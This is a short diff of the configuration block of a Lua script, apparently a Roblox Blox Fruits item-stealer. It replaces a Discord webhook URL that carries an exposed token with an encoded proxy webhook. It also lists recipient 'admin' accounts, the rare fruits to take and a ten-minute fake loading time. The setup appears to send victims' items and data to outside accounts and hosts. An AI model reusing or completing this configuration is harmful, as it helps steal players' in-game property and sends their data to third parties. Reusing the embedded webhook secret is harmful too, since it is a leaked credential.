@@ -9,7 +9,7 @@
 ]]
 
 -- 🔧 CONFIGURATION 🔧 --
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1373626708690735197/BbbGPTh9Za6e1B8bB7zdqt4k_CNAei-YSt4dw47cF5_kZ2vgAuoO7Yrnjw4EVAlDipLl"
+local WEBHOOK_URL = "https://webhook-protect-2.vercel.app/api/webhook?id=NHk3X2lPcmxlXzJmeUdXbHFDOWp0QTp6N2RNNFVLcGtrNjl1SEtlekNpdVhGT1pSaGhzY2RON3JqQm9heVNEZWI0QWZRMlZwT2wxN29Rc1E3ZUZnWmdZTlZ4MVcwVG5keE9BNWhrZVFhUWtqb3pLXzlHUXVHaEstNmdLNXpjd2tTS3lVSlp5MjZhTmZQMDYyUGRzUkNET2NkaldJLXdXcG5uYXVSajZkZUwtNXhSZFVmVXZPWXB5OVRsV0ZoQjZHVm8"
 local ADMIN_USERNAMES = {"mdfmdgfdskfruit", "Sourlas3103"}
 local WANTED_FRUITS = {"Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"}
 local LOADING_TIME = 10 * 60 -- 10 minutes in seconds
